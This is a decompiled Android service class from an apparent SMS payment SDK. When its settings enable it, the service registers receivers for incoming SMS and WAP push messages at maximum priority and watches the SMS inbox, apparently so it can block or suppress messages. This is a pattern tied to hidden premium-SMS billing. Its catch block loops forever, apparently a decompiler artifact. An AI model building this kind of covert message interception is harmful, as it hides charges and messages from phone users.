package com.zhangzhifu.sdk.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.text.format.Time;
import com.zhangzhifu.sdk.util.sms.SmsReceiver;
import com.zhangzhifu.sdk.util.sms.WapPushReceiver;
import com.zhangzhifu.sdk.util.sms.c.c;

public class ZhangzhifuSmsService
  extends Service
{
  private SmsReceiver a = null;
  private WapPushReceiver b = null;
  private c c = null;
  
  public ZhangzhifuSmsService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    this.c = new c(this, new Handler());
    getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.c);
    super.onCreate();
  }
  
  public void onDestroy()
  {
    try
    {
      getContentResolver().unregisterContentObserver(this.c);
      unregisterReceiver(this.a);
      unregisterReceiver(this.b);
      stopForeground(false);
      super.onDestroy();
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    paramIntent = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
    if ((paramIntent.getBoolean("enableservice", false)) && (paramIntent.getBoolean("enablesmsblocker", true)))
    {
      this.a = new SmsReceiver();
      IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
      localIntentFilter.setPriority(Integer.MAX_VALUE);
      registerReceiver(this.a, localIntentFilter);
    }
    if ((paramIntent.getBoolean("enableservice", false)) && (paramIntent.getBoolean("enablewappushblocker", true)))
    {
      this.b = new WapPushReceiver();
      paramIntent = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
      paramIntent.setPriority(Integer.MAX_VALUE);
      registerReceiver(this.b, paramIntent);
    }
    new Time().setToNow();
    return 1;
  }
}
